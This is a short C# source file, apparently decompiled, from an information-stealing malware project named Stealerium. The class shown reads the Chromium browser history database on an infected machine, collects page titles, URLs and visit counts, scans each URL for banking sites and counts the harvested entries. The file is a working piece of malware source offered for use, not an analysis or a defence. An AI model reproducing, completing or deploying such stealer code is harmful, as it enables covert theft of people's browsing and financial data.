using System;
using System.Collections.Generic;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Chromium;

internal sealed class History
{
	public static List<Site> Get(string sHistory)
	{
		List<Site> list = new List<Site>();
		try
		{
			SqLite sqLite = SqlReader.ReadTable(sHistory, "urls");
			if (sqLite == null)
			{
				return list;
			}
			for (int i = 0; i < sqLite.GetRowCount(); i++)
			{
				Site site = default(Site);
				site.Title = Crypto.GetUtf8(sqLite.GetValue(i, 1));
				site.Url = Crypto.GetUtf8(sqLite.GetValue(i, 2));
				site.Count = Convert.ToInt32(sqLite.GetValue(i, 3)) + 1;
				Site item = site;
				Banking.ScanData(item.Url);
				Counter.History++;
				list.Add(item);
			}
			return list;
		}
		catch (Exception ex)
		{
			Logging.Log("Chromium >> Failed collect history\n" + ex);
			return list;
		}
	}
}
